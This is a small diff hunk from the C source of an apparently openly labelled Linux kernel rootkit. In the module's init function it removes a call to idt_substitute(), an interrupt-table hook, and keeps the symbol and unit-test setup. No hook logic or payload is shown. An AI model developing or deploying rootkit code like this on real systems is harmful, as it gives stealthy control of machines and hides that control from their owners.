@@ -14,7 +14,6 @@
 static int __init rootkit_init_module(void)
 {
     /* Init rootkit */
-    idt_substitute();
     init_symbols();
 
     init_unit_tests();
